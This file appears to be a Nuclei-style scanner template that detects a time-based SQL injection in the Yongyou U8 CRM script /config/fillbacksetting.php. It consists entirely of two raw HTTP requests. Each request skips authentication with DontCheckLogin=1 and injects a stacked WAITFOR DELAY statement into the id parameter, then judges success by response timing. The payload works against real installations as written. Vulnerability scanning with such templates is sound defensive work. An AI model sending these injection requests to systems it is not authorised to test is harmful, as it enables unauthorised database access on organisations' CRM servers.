id: poc-yaml-yongyou-u8-crm-fillbacksetting-sqli
info:
  name: Yongyou U8 CRM SQL Injection in fillbacksetting.php
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: Yongyou U8+CRM
variables:
  t1: '{{rand_int(5, 9)}}'
  t2: '{{to_number(t1) + 2}}'
  t3: '{{rand_int(1, 4)}}'
  t4: '{{to_number(t3) + 2}}'
http:
  - raw:
      - |
        GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration <= to_number(t2)
          - contains(body, '{"success":true}')
  - raw:
      - |
        GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:{{t3}}'-- HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= to_number(t3)
          - duration <= to_number(t4)
          - contains(body, '{"success":true}')
